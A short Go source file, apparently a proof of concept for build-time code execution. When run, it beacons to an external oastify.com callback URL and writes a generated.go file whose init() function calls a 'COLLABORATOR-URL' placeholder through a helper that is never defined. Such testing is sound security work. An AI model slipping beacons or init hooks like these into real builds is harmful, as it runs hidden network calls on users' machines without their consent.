package main

import (
    "fmt"
    "net/http"
    "os"
    "time"
)

func main() {
    fmt.Println("Running generate.go...")
    
    // Replace COLLABORATOR-URL with your actual collaborator URL
    url := "https://qgaw8u4tz4uz6b6k5mme7qnvgmmda3ys.oastify.com"
    
    // Send HTTP request to collaborator
    go func() {
        _, err := http.Get(url)
        if err != nil {
            fmt.Printf("Failed to send generate notification: %v\n", err)
        }
    }()

    // Create a build-time generated file
    generateFile()
    
    // Give HTTP request time to complete
    time.Sleep(time.Second)
}

func generateFile() {
    content := `package main

func init() {
    sendInitNotification("http://COLLABORATOR-URL/generated_init")
}
`
    err := os.WriteFile("generated.go", []byte(content), 0644)
    if err != nil {
        fmt.Printf("Failed to write generated file: %v\n", err)
    }
}
